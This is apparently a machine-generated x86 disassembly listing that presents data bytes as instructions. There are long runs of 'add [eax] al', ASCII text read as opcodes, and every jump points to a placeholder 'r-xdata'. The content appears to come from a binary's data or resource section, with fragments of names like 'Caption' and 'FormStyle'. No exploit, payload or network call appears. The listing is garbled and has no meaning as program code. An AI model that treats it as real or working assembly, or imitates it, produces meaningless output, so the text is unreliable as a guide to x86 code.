push 0x65676e61
mov eax eax
fsub st5
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
out 0x48 al
add [ eax - 0xb ] ch
dec eax
add [ edx ] bl
out 0x48 eax
add [ ebx ] al
in eax dx
dec eax
add bh bl
in eax dx
dec eax
add [ ebp - 0x73ffb711 ] al
add eax [ eax ]
add [ edi + edx * 8 ] ch
dec eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
outsd
insd
add [ eax ] dl
inc eax
add [ eax ] ch
add [ eax ] al
[ eax + 0x1004a27 ]
outsb
je r-xdata
dec eax
inc ebp
add [ edi ] al
arpl [ gs : ebx + esi * 2 + 0x43 ] si
outsd
outsb
je r-xdata
add [ esi ] dh
add [ eax + 0x25 ] cl
dec edx
add [ esi ] al
inc ecx
jae r-xdata
add [ edx ] al
and eax 0x25a0004a
dec edx
add [ eax ] al
insb
imul esp [ ebx + 0x69 ] 0x6f460574
jb r-xdata
adc [ eax ] al
or al 0x0
add bh bh
dec eax
daa
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
outsd
insb
add eax [ eax ]
add [ eax + eax ] al
add [ eax ] al
pop es
inc esi
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x274
add [ eax ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] cl
inc esi
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add al [ eax ]
add [ eax + edx + 0xc0040 ] bl
add [ eax ] al
add eax 0x66654c46
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ ebp + esi * 8 + 0x48 ] ah
jae r-xdata
sar [ edx + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x48e27cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_48e50c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x68530c00
je r-xdata
add [ eax ] al
add [ eax + 0x4f08ffff ] al
outsb
inc ebx
push 0x65676e61
mov eax eax
fsub st5
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
out 0x48 al
add [ eax - 0xb ] ch
dec eax
add [ edx ] bl
out 0x48 eax
add [ ebx ] al
inc di
insb
popad
jae r-xdata
in eax dx
dec eax
add bh bl
in eax dx
dec eax
add [ ebp - 0x73ffb711 ] al
add eax [ eax ]
add [ edi + edx * 8 ] ch
dec eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
pop es
add [ edx ] al
pop ebx
in eax 0x48
add [ edx ] al
add [ ebx ] al
pop edi
in al 0x48
add [ edx ] al
add [ ebx ] al
and esp 0x20048
add esp [ eax + 0x20048e4 ]
add [ ebx ] al
mov esi 0x20048e4
add [ ebx ] al
fsubrp st4
dec eax
add [ edx ] al
add [ ebx ] al
jmp esp
sub_48ef3a
push 0x9d180049
dec ecx
add [ edx + ebp * 2 ] bl
dec ecx
add [ edx + ebp * 2 ] bh
dec ecx
add [ edx + ebp * 2 + 0x49 ] bl
add [ ecx + edi * 2 ] dh
dec ecx
add al ch
jpe r-xdata
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] bl
aad 0x42
add [ eax + 0x6b ] dh
dec ecx
add al ah
les ecx [ ecx ]
je r-xdata
insb
add al [ eax ]
add al [ eax ]
and eax 0x49b6b800
add [ 0x736f6c43 ] al
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub al [ eax ]
pop esp
mov bh 0x49
add [ edx ] cl
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
inc ecx
dec edi
ja r-xdata
dec ecx
add [ eax - 0x63 ] cl
dec ecx
add [ eax - 0x53ffb661 ] al
imul ecx [ ecx ] 0xffffffe0
jge r-xdata
outsw
push ecx
jne r-xdata
add [ eax ] cl
add [ edx ] al
add [ edx ] al
add [ esi ] al
add [ ebp * 2 + 0x7d9c0049 ] dl
dec ecx
add [ ebx + ebp * 2 ] al
dec ecx
add ah dh
retn
add al [ gs : eax ]
add ah cl
test al 0x40
outsd
insb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
cmc
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
add [ 0x4997b400 ] bh
add [ esi + eax * 2 ] cl
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
add [ edx ] al
insb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
outsd
dec eax
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
aas
add [ esi + edx * 4 ] ch
dec ecx
add [ esi ] cl
inc esp
popa
jne r-xdata
add [ eax + eax ] ch
pop eax
mov eax 0x470c0049
outsd
insb
add al [ eax ]
add al [ eax ]
and al 0x0
mov al [ 0x40049bb ]
dec eax
imul esp [ ebp + 0x3 ] 0x0
add [ eax ] cl
add [ ecx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
hlt
outsd
insb
add al [ eax ]
add al [ eax ]
inc edi
add al [ eax ]
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
outsb
add al [ bx + si ]
add al [ eax ]
dec eax
add [ ebp + edi * 2 + 0x44040049 ] bl
outsd
arpl [ ebx + 0x3 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ebx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
adc [ eax ] al
add al [ eax ]
or [ edx + 0x65 ] dl
insd
outsd
jbe r-xdata
je r-xdata
add ah dh
retn
outsd
jb r-xdata
je r-xdata
inc edi
push 0x72646c69
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax [ eax ]
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax - 0x34 ] dh
inc edx
add [ eax ] cl
add [ eax + edx * 2 ] al
jb r-xdata
add ah dl
mov [ 0x10046 ] eax
pop es
inc ebx
outsd
outsb
je r-xdata
add [ edx ] al
add [ 0x63655241 ] al
je r-xdata
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x2 ] 0xa8cc0000
inc eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah dl
mov [ 0x10046 ] eax
pop es
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] cl
add [ ebx ] al
add [ ebp + esi * 8 + 0x48 ] ah
popad
outsb
insb
jb r-xdata
inc eax
add [ ecx ] al
dec ecx
insd
popad
add eax [ gs : bx + si ]
js r-xdata
jb r-xdata
arpl [ edx ] ax
add [ eax ] al
sbb ch dl
inc edx
add [ ecx ] al
add [ edx + edx * 2 ] al
outsd
outsd
je r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ edi ] al
dec ebp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ebp + esi * 8 + 0x48 ] ah
insb
add al [ eax ]
add [ eax + ecx * 8 ] ebx
inc eax
add [ ecx ] al
add [ edi ] al
dec ebp
jae r-xdata
popad
add al [ gs : bx + si ]
add al [ eax ]
inc edx
add [ eax - 0x3a ] dh
dec ecx
add [ eax ] dl
dec ebp
popad
imul esp [ ebp + 0x46 ] 0x75
insb
insb
jns r-xdata
add [ ebx + ebp * 2 ] al
dec ecx
add [ ebx ] cl
inc edi
je r-xdata
inc esp
add [ eax ] cl
add [ ecx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ ecx ] dl
inc ebx
jne r-xdata
add [ edx ] al
insb
add al [ eax ]
add ah dl
mov [ 0x10046 ] eax
or ecx [ esi + 0x65 ]
ja r-xdata
add al 0x53
popad
add al [ gs : bx + si ]
add al [ eax ]
push ecx
add [ edi + edx * 4 + 0x49 ] ch
add [ esi ] cl
inc esp
add [ esp + edi * 4 + 0x49 ] bh
add [ edi ] al
push edx
insb
popad
jae r-xdata
popad
add al [ gs : bx + si ]
add al [ eax ]
and eax 0x49b97000
add [ 0x6e697250 ] al
je r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
dec ebp
imul esi [ ebx + 0x69 ] 0x3656c62
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx + 0x49 ] ch
add [ ecx ] al
add [ eax ] cl
inc ecx
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x20002
inc edx
add [ eax + 0x110049c4 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ebp + esi * 8 + 0x48 ] ah
push edi
push 0x486c6565
popad
outsb
insb
jb r-xdata
outsd
jne r-xdata
add [ edi ] al
dec ebp
jae r-xdata
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add eax edi
enter 0x40 0x1
jae r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
inc esi
add [ esp + edi * 4 + 0x49 ] cl
add [ edi ] cl
push edx
arpl [ gs : edx + 0x65 ] si
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al bl
test [ esi ] al
add [ eax ] eax
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ebp + esi * 8 + 0x48 ] ah
popad
outsb
insb
add al [ gs : eax ]
add al [ eax ]
daa
add [ eax ] al
or [ eax ] al
add al [ eax ]
cmc
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
inc edx
add [ eax ] ah
cwde
dec ecx
add [ ecx ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] ch
add al al
mov ebx 0x53080049
je r-xdata
add [ edx ] al
outsb
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
dec ebp
outsd
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
push ebx
inc ecx
jae r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] eax
cwde
mov esp 0x53090049
push 0x6f4d776f
popad
insb
add eax [ eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add [ eax ] eax
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
push ebx
outsd
arpl [ ebp + 0x73 ] si
add eax [ eax ]
add [ eax ] al
insb
add al [ eax ]
add al [ eax ]
add [ ebx + ebx * 4 + 0x530e0049 ] ah
add [ eax ] al
add al 0x53
outsd
jo r-xdata
test [ ecx ] ecx
push 0x4b646c69
jns r-xdata
insb
add al [ eax ]
add al [ eax ]
dec esp
add [ eax + 0xc00496d ] al
push edi
popad
outsb
je r-xdata
insb
add al [ eax ]
add ah dl
mov [ 0x10046 ] eax
pop es
inc ebx
outsd
outsb
je r-xdata
outsd
insb
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
dec eax
outsd
insb
add al [ eax ]
add al [ eax ]
and al 0x0
test al 0xbb
dec ecx
add [ ebx + edx * 2 ] al
push 0x3776f
add [ eax ] al
add al [ eax ]
cmc
dec eax
jo r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al bl
test [ esi ] al
add [ eax ] eax
add eax 0x6c696843
add al [ fs : eax ]
add [ eax + ecx * 8 ] ebx
inc eax
add [ edx ] al
add [ edi ] al
dec ebp
jae r-xdata
inc eax
add [ eax ] cl
add [ ebx ] al
add [ ebp + esi * 8 + 0x48 ] ah
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add eax [ eax ]
cmc
add [ edx ] al
add [ ecx ] dh
add [ eax ] bh
pushad
dec ecx
popad
add al [ gs : bx + si ]
add al [ eax ]
add [ ds : ebp + eax * 4 + 0x730f0049 ] al
je r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah bl
scasb [ edi ]
inc eax
add [ ecx ] al
add [ 0x6e695741 ] cl
outsd
ja r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
cmc
dec eax
je r-xdata
inc esp
jae r-xdata
add [ ecx ] dl
inc edx
outsw
add al [ eax ]
add al [ eax ]
xor [ eax ] eax
cmp [ eax + 0x49 ] ah
push eax
outsd
jo r-xdata
jb r-xdata
adc [ eax ] al
test [ eax + 0x49 ] ch
add [ eax + 0x10049c7 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] 0x3
jo r-xdata
add [ eax + 0x54030004 ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmc
dec eax
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
jle r-xdata
adc esi edi
dec eax
add [ edx ] al
add [ edx ] al
cmp edi esi
dec eax
add [ edx ] al
add [ edx ] al
pop edx
outsd
insd
cmc
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4110ffff ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
dec edi
insb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410dffff ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
outsb
je r-xdata
outsd
jo r-xdata
add [ ebx ] al
push esp
dec eax
add [ edx ] al
add [ edx ] al
lahf
test [ eax ] 0x2
add [ edx ] al
test [ eax ] 0x7c020002
test [ eax ] 0x9c020002
test [ eax ] 0xbf020002
test [ eax ] 0xe4020002
test [ eax ] 0x3020002
clc
dec eax
add [ edx ] al
add [ edx ] al
daa
clc
dec eax
add [ edx ] al
add [ edx ] al
dec esp
clc
dec eax
add [ edx ] al
add [ edx ] al
outsd
clc
dec eax
add [ edx ] al
add [ edx ] al
xchg esp eax
clc
dec eax
add [ edx ] al
add [ edx ] al
mov bl 0xf8
dec eax
add [ edx ] al
add [ edx ] al
fprem
dec eax
add [ edx ] al
add [ edx ] al
sti
clc
dec eax
add [ edx ] al
add [ edx ] al
and edi ecx
dec eax
add [ edx ] al
add [ edx ] al
inc edi
stc
dec eax
add [ edx ] al
add [ edx ] al
insb
stc
dec eax
add [ edx ] al
add [ edx ] al
xchg ecx eax
stc
dec eax
add [ edx ] al
add [ edx ] al
mov bh 0xf9
dec eax
add [ edx ] al
add [ ebx ] al
xchg ebp esi
dec eax
add [ edx ] al
add [ ebx ] al
cmpsb [ esi ] [ edi ]
cmc
dec eax
add [ edx ] al
add [ edx ] al
add [ eax ] al
adc [ eax ] al
popfd
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106ffff ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
aam 0xa3
inc esi
add [ eax - 0x6f00fffe ] dl
add dl [ ebx ]
test [ eax ] 0x39020002
test [ eax ] 0x5a020002
fsub st5
dec eax
add [ eax + 0x130048da ] cl
add [ 0x6d726f46 ] al
jae r-xdata
jb r-xdata
outsd
outsb
je r-xdata
outsd
insb
jl r-xdata
insb
clc
nop
inc esp
add al bl
jg r-xdata
outsd
insb
jo r-xdata
adc [ eax ] al
push 0xc75c0049
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c040003 ] al
je r-xdata
add [ eax + edx + 0x68640040 ] bl
dec ecx
add [ eax ] al
or [ eax ] al
add al [ eax ]
cmc
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ebp + esi * 8 + 0x48 ] ah
add [ ecx ] al
add [ 0x756c6156 ] al
add al [ gs : eax ]
add al [ eax ]
xor [ eax ] eax
cmp al 0x5e
dec ecx
add [ ecx ] dl
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ebp + esi * 8 + 0x48 ] ah
push eax
xchg edi eax
dec ecx
add [ ecx ] al
add [ eax ] al
dec eax
add [ ecx - 0x300fffe ] bl
jpo r-xdata
adc [ edi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4306ffff ] al
popad
outsb
jbe r-xdata
xchg esi eax
dec ecx
add ah ch
jg r-xdata
add bh bh
nop
inc edx
add [ eax + eax ] cl
inc esi
outsd
jb r-xdata
jb r-xdata
jg r-xdata
add ah ch
jg r-xdata
imul esp [ edi + 0x6e ] 0x10007265
inc eax
add [ edx - 0x5d00fffe ] ah
jae r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
nop
push 0x70048f5
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ ecx ] al
add [ ebp + esi * 8 + 0x48 ] ah
outsd
outsb
jae r-xdata
add [ eax + 0x4408ffff ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307ffff ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
inc eax
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
inc esi
add [ eax + 0xe ] dl
inc edi
add [ eax - 0x13ffb8f2 ] cl
jb r-xdata
popad
outsb
jb r-xdata
cmova eax [ eax ]
pop esp
cmova eax [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
imul ebp [ edi + 0x6e ] sub_446758
insb
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
jb r-xdata
add [ edi + eax * 8 + 0x49 ] bl
inc eax
add [ eax + ebp * 2 + 0x49 ] ah
dec eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cmc
jns r-xdata
cmp al 0xe4
dec eax
add [ ebx + eax ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440affff ] al
adc [ eax ] al
mov [ 0xffffffffa2ff0002 ] al
adc al [ eax ]
test al 0x2
add bh bh
test al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
je r-xdata
jg r-xdata
jb r-xdata
insd
push ebx
je r-xdata
jno r-xdata
add bh bh
xor [ ebp + 0x10049 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
int3
jbe r-xdata
add bh bh
dec [ edx ]
dec ebx
jns r-xdata
je r-xdata
je r-xdata
add [ eax + eax ] ah
dec [ edi + ecx + 0x47 ]
add [ edi + ecx + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604ffff ] al
outsd
outsb
je r-xdata
sbb al 0xdc
dec eax
add ah cl
add al [ eax ]
dec esp
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0dffff ] al
insb
inc esi
outsd
jb r-xdata
ja r-xdata
add bh bh
fadd st7
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x470affff ] al
insb
popad
jae r-xdata
jb r-xdata
dec [ edx ]
inc esp
loopne r-xdata
jo r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x1f ] si
dec eax
add [ eax + 0x3 ] cl
or [ ecx ] 0xec
jg r-xdata
cmpsd [ esi ] [ edi ]
inc ebp
add [ edx + eax - 0x7da70100 ] dh
dec ecx
add ah ch
inc esi
jb r-xdata
inc eax
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4808ffff ] al
insb
jo r-xdata
add [ ebx + eax + 0xff00 ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp bh 0xff
or edx [ eax + 0x6f ]
jo r-xdata
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4d07ffff ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04ffff ] al
outsb
cmp bh 0xff
add al 0x4d
insd
inc eax
jne r-xdata
imul ebp [ ebp ] 0x9c004010
add al [ eax ]
[ edx + eax + 0x7fecff00 ]
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ esp + 0x49 ] bh
jo r-xdata
add [ eax ] al
add [ eax ] al
push eax
sti
jb r-xdata
daa
inc esi
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0bffff ] al
outsd
popad
insb
push edx
jae r-xdata
sub al 0x96
dec ecx
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x5677ffb7 ] ch
inc edi
add [ edi ] cl
dec ecx
add ah cl
adc al [ ebx ]
mov esp 0x40004962
arpl [ ecx ] cx
jl r-xdata
popad
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
salc
dec eax
add [ edx - 0x1b00fffe ] bl
xchg [ ecx ] cl
in al dx
jg r-xdata
add eax [ eax ]
jmp [ eax + 0x3 ]
insb
je r-xdata
dec ecx
add [ eax + 0x6c ] al
dec ecx
add ah ch
push cs
inc edi
add [ eax + 0x400496e ] al
std
inc esi
add [ esp + edi ] dl
inc edi
add [ edx + ebx * 4 - 0x6437ffb9 ] dh
inc edi
add [ eax ] ah
xchg ebp eax
inc edi
add [ ebx + ebx * 4 + 0x5b840047 ] ch
dec ecx
add [ eax + 0x20004976 ] bl
pushad
inc edi
add [ eax - 0x75 ] al
dec ecx
add [ eax ] bh
xchg ebx eax
dec ecx
add [ ecx + edx * 4 ] bh
dec ecx
add [ eax - 0x23ffb8a0 ] bh
pushad
inc edi
add [ esp + edx * 4 - 0x6a17ffb7 ] dh
dec ecx
add ah dh
pop esi
inc edi
add ah al
mov ecx 0x9cf40047
inc edi
add [ ebp + ebx * 4 - 0x46c3ffb7 ] al
inc edi
add [ eax + 0xc004764 ] dh
cdq
inc edi
add [ edx + edi * 4 - 0x443fffb9 ] cl
dec ecx
add [ eax ] dh
push esp
dec ecx
add [ eax + 0x50004957 ] cl
cmpsb [ esi ] [ edi ]
dec ecx
add al ah
popad
dec ecx
add [ edx + 0x49 ] bl
add [ eax - 0x40 ] bl
dec ecx
add al dh
pop edi
dec ecx
add [ edi + esi * 4 + 0x49 ] bl
add [ eax ] ah
cwde
dec ecx
add [ eax - 0x7fffb644 ] bl
insd
dec ecx
add [ eax ] al
add [ 0x48fb8200 ] al
add [ edx ] al
hlt
add [ eax ] bh
or al 0x47
add [ eax ] bl
int 0x43
add [ eax + 0x6e ] al
dec ecx
add [ esi + eax * 8 - 0x3b93ffbd ] bl
dec ecx
add [ esp + ebx * 2 - 0x3403ffb7 ] dl
inc ebx
add [ ebx - 0x5647ffb9 ] ch
inc edi
add [ ecx + ebp * 4 ] al
inc edi
add al al
inc edi
add [ eax + 0x55 ] ch
dec ecx
add ah bl
push ebp
dec ecx
add ah al
std
inc esi
add [ eax ] ch
sahf
inc edi
add [ edx + ebp * 2 + 0x49 ] bh
add [ eax - 0x66 ] ah
inc edi
add [ eax ] cl
std
inc esi
add [ eax - 0x6fffb695 ] cl
cmp eax [ edi ]
sbb cl al
dec ecx
add [ eax ] ah
or al 0x47
add [ eax - 0x57ffb901 ] ah
or eax 0x6d840047
dec ecx
int3
outsb
je r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 + 0x48 ] bh
add [ ebx + eax - 0x1a800000 ] cl
dec eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x5 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ gs : eax ] dl
inc eax
add [ eax + 0x3 ] ah
add bh bh
pushad
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ ecx ] ecx
cmp [ edi + 0x49 ] bh
jo r-xdata
inc eax
add [ eax ] bh
cli
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
add eax [ fs : eax ]
jmp [ ebx + eax ]
sub_490e36
inc ebx
add [ esi + ebx * 2 ] bh
dec ecx
add [ eax ] bh
pushad
dec ecx
add al bl
pop eax
inc eax
add [ esi + edx * 4 ] ch
dec ecx
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x5677ffb7 ] ch
inc edi
add [ edi ] cl
dec ecx
add ah cl
adc al [ ebx ]
xor ch cl
dec ecx
add [ eax + 0x63 ] al
dec ecx
add [ esp + 0x49 ] bh
add [ eax ] bh
or al 0x47
add [ eax ] bl
int 0x43
add [ eax + 0x6e ] al
dec ecx
add [ esi + eax * 8 - 0x3b93ffbd ] bl
dec ecx
add [ eax ] ah

sub_490f88
mov esi 0xa8ffbcff
int 0x49
add al dl
int 0x49
add [ esi + ecx * 8 - 0x2fafffb7 ] bh
dec ecx
add [ esi + ecx * 8 + 0x49 ] ah
add [ eax ] bh
ror [ ecx ] 0x1
mov bl cl
dec ecx
add [ eax ] dl
int 0x49
add [ ebp + ecx * 8 + 0x49 ] bh
add [ edi ] cl
push esp
inc ebx
jne r-xdata
test [ ecx ] cl
add [ eax ] al
je r-xdata
add al [ eax ]
jb r-xdata
add al ah
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
fisttp [ eax ]
cdq
outsb
arpl [ eax + 0x4 ] bp
add [ edx ] al
adc [ bx + di ] cl
add al [ eax ]
add cl [ eax + edx + 0x20049 ]
add dh [ edx + 0x2004910 ]
add [ ebx ] al
pop ds
adc [ ecx ] cl
add al [ eax ]
add al [ eax ]
add [ eax ] dl
inc eax
add [ edx + eax ] dh
push [ esi + edx * 2 ]
dec ecx
add al ch
imul ecx [ ecx ] 0x80000000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or eax 0x65786950
insb
jae r-xdata
add [ ss : eax ] ah

sub_491080
dec [ edx ]
inc ecx
jne r-xdata
adc [ ecx ] ecx
adc [ eax ] al
add [ eax ] al
cmp al 0x14
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
